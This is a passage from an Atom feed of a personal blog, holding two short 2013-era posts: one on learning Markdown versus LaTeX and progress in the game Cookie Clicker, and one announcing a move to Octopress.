    <content type="html"><![CDATA[<p>Markdown looks like an easy-ish language to start (probably not so easy to master of course).
Although compared to writing LaTeX source, it is a breeze. During my last year at JHU I started writing the reports and what not directly into LaTeX,
I think using MarkDown for blogging and MS Office at work is going to take away my old skills.</p>

<p>On a side note, I am now up to around 500 million cookies per second (CpS) in
<strong><a href="http://orteil.dashnet.org/cookieclicker/">Cookie Clicker</a></strong>. I was stuck at 200 million CpS for a week or so until I could start making Antimatter Condensers. I may have missed them before
as they were not visible in the side-bar and I had to scroll down to see them.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hello Octopress]]></title>
    <link href="http://parsiya.net/blog/2013-09-14-hello-octopress/"/>
    <updated>2013-09-14T21:16:00-04:00</updated>
    <id>http://parsiya.net/blog/hello-octopress</id>
    <content type="html"><![CDATA[<p>** Octopress is here **</p>

<p>To be honest setting it up took a while (I had this feeling that I should set it up on my host but well let’s say I am a n00b and am allowed to make mistakes) :D</p>

<p>Now I have to learn markdown which is probably a good thing, unless I can write blog posts in different formats. Note to self: search to see if we can write blogs in LaTeX. That would be too geeky.</p>
]]></content>
  </entry>
  
</feed>
